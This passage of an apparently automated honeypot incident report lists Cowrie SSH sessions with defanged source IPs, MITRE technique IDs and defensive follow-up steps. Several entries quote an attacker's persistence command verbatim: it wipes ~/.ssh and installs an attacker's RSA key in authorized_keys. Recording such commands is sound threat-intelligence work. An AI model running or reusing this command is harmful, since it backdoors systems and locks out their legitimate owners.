| `2026-06-30 16:09:50` | `cowrie.client.kex` |
| `2026-06-30 16:09:51` | `cowrie.login.success` |
| `2026-06-30 16:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.135[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.97.135[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-febce57fbe01

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 16:10 |
| **Last Seen** | 2026-06-30 16:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:10:05` | `cowrie.session.connect` |
| `2026-06-30 16:10:05` | `cowrie.client.version` |
| `2026-06-30 16:10:05` | `cowrie.client.kex` |
| `2026-06-30 16:10:07` | `cowrie.login.success` |
| `2026-06-30 16:10:09` | `cowrie.session.params` |
| `2026-06-30 16:10:09` | `cowrie.command.input` |
| `2026-06-30 16:10:10` | `cowrie.log.closed` |
| `2026-06-30 16:10:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60c76801cc1a

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 16:15 |
| **Last Seen** | 2026-06-30 16:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:15:28` | `cowrie.session.connect` |
| `2026-06-30 16:15:28` | `cowrie.client.version` |
| `2026-06-30 16:15:28` | `cowrie.client.kex` |
| `2026-06-30 16:15:28` | `cowrie.login.success` |
| `2026-06-30 16:15:29` | `cowrie.session.params` |
| `2026-06-30 16:15:29` | `cowrie.command.input` |
| `2026-06-30 16:15:29` | `cowrie.log.closed` |
| `2026-06-30 16:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b233fab0bf7a

| Field | Detail |
|---|---|
| **Source IP** | `187.230.85[.]160` |
| **First Seen** | 2026-06-30 16:17 |
| **Last Seen** | 2026-06-30 16:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:17:44` | `cowrie.session.connect` |
| `2026-06-30 16:17:44` | `cowrie.client.version` |
| `2026-06-30 16:17:44` | `cowrie.client.kex` |
| `2026-06-30 16:17:44` | `cowrie.login.success` |
| `2026-06-30 16:17:45` | `cowrie.session.params` |
| `2026-06-30 16:17:45` | `cowrie.command.input` |
| `2026-06-30 16:17:45` | `cowrie.command.failed` |
| `2026-06-30 16:17:45` | `cowrie.log.closed` |
| `2026-06-30 16:17:46` | `cowrie.session.params` |
| `2026-06-30 16:17:46` | `cowrie.command.input` |
| `2026-06-30 16:17:46` | `cowrie.session.file_download` |
| `2026-06-30 16:17:46` | `cowrie.log.closed` |
| `2026-06-30 16:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.230.85[.]160` to AbuseIPDB if not already reported
- [ ] Block `187.230.85[.]160` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a93ba06f9ccd

| Field | Detail |
|---|---|
| **Source IP** | `187.230.85[.]160` |
| **First Seen** | 2026-06-30 16:17 |
| **Last Seen** | 2026-06-30 16:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:17:46` | `cowrie.session.connect` |
| `2026-06-30 16:17:46` | `cowrie.client.version` |
| `2026-06-30 16:17:46` | `cowrie.client.kex` |
| `2026-06-30 16:17:46` | `cowrie.login.success` |
| `2026-06-30 16:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.230.85[.]160` to AbuseIPDB if not already reported
- [ ] Block `187.230.85[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-266429fa737f

| Field | Detail |
|---|---|
| **Source IP** | `187.230.85[.]160` |
| **First Seen** | 2026-06-30 16:17 |
| **Last Seen** | 2026-06-30 16:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:17:47` | `cowrie.session.connect` |
| `2026-06-30 16:17:47` | `cowrie.client.version` |
| `2026-06-30 16:17:47` | `cowrie.client.kex` |
| `2026-06-30 16:17:47` | `cowrie.login.success` |
| `2026-06-30 16:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.230.85[.]160` to AbuseIPDB if not already reported
- [ ] Block `187.230.85[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-967cca0424c5

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-30 16:19 |
| **Last Seen** | 2026-06-30 16:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:19:13` | `cowrie.session.connect` |
| `2026-06-30 16:19:13` | `cowrie.client.version` |
| `2026-06-30 16:19:14` | `cowrie.client.kex` |
| `2026-06-30 16:19:15` | `cowrie.login.success` |
| `2026-06-30 16:19:15` | `cowrie.session.params` |
| `2026-06-30 16:19:15` | `cowrie.command.input` |
| `2026-06-30 16:19:15` | `cowrie.command.failed` |
| `2026-06-30 16:19:16` | `cowrie.log.closed` |
| `2026-06-30 16:19:17` | `cowrie.session.params` |
| `2026-06-30 16:19:17` | `cowrie.command.input` |
| `2026-06-30 16:19:17` | `cowrie.session.file_download` |
| `2026-06-30 16:19:17` | `cowrie.log.closed` |
| `2026-06-30 16:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3487dec8c25c

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-30 16:19 |
| **Last Seen** | 2026-06-30 16:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:19:17` | `cowrie.session.connect` |
| `2026-06-30 16:19:17` | `cowrie.client.version` |
| `2026-06-30 16:19:18` | `cowrie.client.kex` |
| `2026-06-30 16:19:19` | `cowrie.login.success` |
| `2026-06-30 16:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31e6f9ee88ed

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-30 16:19 |
| **Last Seen** | 2026-06-30 16:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:19:19` | `cowrie.session.connect` |
| `2026-06-30 16:19:19` | `cowrie.client.version` |
| `2026-06-30 16:19:20` | `cowrie.client.kex` |
| `2026-06-30 16:19:21` | `cowrie.login.success` |
| `2026-06-30 16:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afce13b1f910

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 16:20 |
| **Last Seen** | 2026-06-30 16:20 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:20:42` | `cowrie.session.connect` |
| `2026-06-30 16:20:43` | `cowrie.client.version` |
| `2026-06-30 16:20:43` | `cowrie.client.kex` |
| `2026-06-30 16:20:49` | `cowrie.login.success` |
| `2026-06-30 16:20:52` | `cowrie.session.params` |
| `2026-06-30 16:20:52` | `cowrie.command.input` |
| `2026-06-30 16:20:55` | `cowrie.log.closed` |
| `2026-06-30 16:20:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac49cf3b6d9d

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]80` |
| **First Seen** | 2026-06-30 16:21 |
| **Last Seen** | 2026-06-30 16:26 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:21:55` | `cowrie.session.connect` |
| `2026-06-30 16:21:55` | `cowrie.client.version` |
| `2026-06-30 16:21:55` | `cowrie.client.kex` |
| `2026-06-30 16:21:57` | `cowrie.login.success` |
| `2026-06-30 16:21:58` | `cowrie.session.params` |
| `2026-06-30 16:21:58` | `cowrie.command.input` |
| `2026-06-30 16:21:58` | `cowrie.command.failed` |
| `2026-06-30 16:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2def53d1f1a0

| Field | Detail |
|---|---|
| **Source IP** | `186.96.158[.]180` |
| **First Seen** | 2026-06-30 16:22 |
| **Last Seen** | 2026-06-30 16:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:22:43` | `cowrie.session.connect` |
| `2026-06-30 16:22:43` | `cowrie.client.version` |
| `2026-06-30 16:22:43` | `cowrie.client.kex` |
| `2026-06-30 16:22:43` | `cowrie.login.success` |
| `2026-06-30 16:22:44` | `cowrie.session.params` |
| `2026-06-30 16:22:44` | `cowrie.command.input` |
| `2026-06-30 16:22:44` | `cowrie.command.failed` |
| `2026-06-30 16:22:44` | `cowrie.log.closed` |
| `2026-06-30 16:22:45` | `cowrie.session.params` |
| `2026-06-30 16:22:45` | `cowrie.command.input` |
| `2026-06-30 16:22:45` | `cowrie.session.file_download` |
| `2026-06-30 16:22:45` | `cowrie.log.closed` |
| `2026-06-30 16:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.158[.]180` to AbuseIPDB if not already reported
- [ ] Block `186.96.158[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f64d749ed9d5

| Field | Detail |
|---|---|
| **Source IP** | `186.96.158[.]180` |
| **First Seen** | 2026-06-30 16:22 |
| **Last Seen** | 2026-06-30 16:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:22:45` | `cowrie.session.connect` |
| `2026-06-30 16:22:45` | `cowrie.client.version` |
| `2026-06-30 16:22:45` | `cowrie.client.kex` |
| `2026-06-30 16:22:45` | `cowrie.login.success` |
| `2026-06-30 16:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.158[.]180` to AbuseIPDB if not already reported
- [ ] Block `186.96.158[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b773f81ae6a0

| Field | Detail |
|---|---|
| **Source IP** | `186.96.158[.]180` |
| **First Seen** | 2026-06-30 16:22 |
| **Last Seen** | 2026-06-30 16:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:22:45` | `cowrie.session.connect` |
| `2026-06-30 16:22:45` | `cowrie.client.version` |
| `2026-06-30 16:22:46` | `cowrie.client.kex` |
| `2026-06-30 16:22:46` | `cowrie.login.success` |
| `2026-06-30 16:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.158[.]180` to AbuseIPDB if not already reported
- [ ] Block `186.96.158[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2429a8eb0f50

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 16:26 |
| **Last Seen** | 2026-06-30 16:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:26:40` | `cowrie.session.connect` |
| `2026-06-30 16:26:40` | `cowrie.client.version` |
| `2026-06-30 16:26:40` | `cowrie.client.kex` |
| `2026-06-30 16:26:42` | `cowrie.login.success` |
| `2026-06-30 16:26:44` | `cowrie.session.params` |
| `2026-06-30 16:26:44` | `cowrie.command.input` |
| `2026-06-30 16:26:45` | `cowrie.log.closed` |
| `2026-06-30 16:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27a3664065e0

| Field | Detail |
|---|---|
| **Source IP** | `190.32.246[.]14` |
| **First Seen** | 2026-06-30 16:27 |
| **Last Seen** | 2026-06-30 16:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:27:06` | `cowrie.session.connect` |
| `2026-06-30 16:27:06` | `cowrie.client.version` |
| `2026-06-30 16:27:06` | `cowrie.client.kex` |
| `2026-06-30 16:27:07` | `cowrie.login.success` |
| `2026-06-30 16:27:07` | `cowrie.session.params` |
| `2026-06-30 16:27:07` | `cowrie.command.input` |
| `2026-06-30 16:27:07` | `cowrie.command.failed` |
| `2026-06-30 16:27:08` | `cowrie.log.closed` |
| `2026-06-30 16:27:08` | `cowrie.session.params` |
| `2026-06-30 16:27:08` | `cowrie.command.input` |
| `2026-06-30 16:27:09` | `cowrie.session.file_download` |
| `2026-06-30 16:27:09` | `cowrie.log.closed` |
| `2026-06-30 16:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.32.246[.]14` to AbuseIPDB if not already reported
- [ ] Block `190.32.246[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5695954ad64c

| Field | Detail |
|---|---|
| **Source IP** | `190.32.246[.]14` |
| **First Seen** | 2026-06-30 16:27 |
| **Last Seen** | 2026-06-30 16:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:27:09` | `cowrie.session.connect` |
| `2026-06-30 16:27:09` | `cowrie.client.version` |
| `2026-06-30 16:27:09` | `cowrie.client.kex` |
| `2026-06-30 16:27:09` | `cowrie.login.success` |
| `2026-06-30 16:27:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.32.246[.]14` to AbuseIPDB if not already reported
- [ ] Block `190.32.246[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3bde99f373c

| Field | Detail |
|---|---|
| **Source IP** | `190.32.246[.]14` |
| **First Seen** | 2026-06-30 16:27 |
| **Last Seen** | 2026-06-30 16:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:27:09` | `cowrie.session.connect` |
| `2026-06-30 16:27:09` | `cowrie.client.version` |
| `2026-06-30 16:27:09` | `cowrie.client.kex` |
| `2026-06-30 16:27:10` | `cowrie.login.success` |
| `2026-06-30 16:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.32.246[.]14` to AbuseIPDB if not already reported
- [ ] Block `190.32.246[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad0023de3348

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 16:32 |
| **Last Seen** | 2026-06-30 16:32 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:32:14` | `cowrie.session.connect` |
| `2026-06-30 16:32:16` | `cowrie.client.version` |
| `2026-06-30 16:32:16` | `cowrie.client.kex` |
| `2026-06-30 16:32:22` | `cowrie.login.success` |
| `2026-06-30 16:32:26` | `cowrie.session.params` |
| `2026-06-30 16:32:26` | `cowrie.command.input` |
| `2026-06-30 16:32:28` | `cowrie.log.closed` |
| `2026-06-30 16:32:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeb145320edc

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 16:42 |
| **Last Seen** | 2026-06-30 16:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:42:40` | `cowrie.session.connect` |
| `2026-06-30 16:42:40` | `cowrie.client.version` |
| `2026-06-30 16:42:40` | `cowrie.client.kex` |
| `2026-06-30 16:42:42` | `cowrie.login.success` |
| `2026-06-30 16:42:43` | `cowrie.session.params` |
| `2026-06-30 16:42:43` | `cowrie.command.input` |
| `2026-06-30 16:42:43` | `cowrie.log.closed` |
| `2026-06-30 16:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b39df710ea8d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 16:44 |
| **Last Seen** | 2026-06-30 16:44 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:44:13` | `cowrie.session.connect` |
| `2026-06-30 16:44:14` | `cowrie.client.version` |
| `2026-06-30 16:44:14` | `cowrie.client.kex` |
| `2026-06-30 16:44:21` | `cowrie.login.success` |
| `2026-06-30 16:44:25` | `cowrie.session.params` |
| `2026-06-30 16:44:25` | `cowrie.command.input` |
| `2026-06-30 16:44:26` | `cowrie.log.closed` |
| `2026-06-30 16:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e710c84147ed

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-30 16:49 |
| **Last Seen** | 2026-06-30 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:49:07` | `cowrie.session.connect` |
| `2026-06-30 16:49:07` | `cowrie.client.version` |
| `2026-06-30 16:49:07` | `cowrie.client.kex` |
| `2026-06-30 16:49:08` | `cowrie.login.success` |
| `2026-06-30 16:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17f2e256e053

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-30 16:49 |
| **Last Seen** | 2026-06-30 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:49:07` | `cowrie.session.connect` |
| `2026-06-30 16:49:07` | `cowrie.client.version` |
| `2026-06-30 16:49:07` | `cowrie.client.kex` |
| `2026-06-30 16:49:08` | `cowrie.login.success` |
| `2026-06-30 16:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.53.135[.]16` | **30** | 2026-06-30 14:21 | 2026-06-30 14:21 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `35.205.202[.]250` | **30** | 2026-06-30 13:39 | 2026-06-30 13:40 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **10** | 2026-06-30 13:12 | 2026-06-30 16:53 | 10m | 0 | `T1592` | 🟠 MEDIUM |
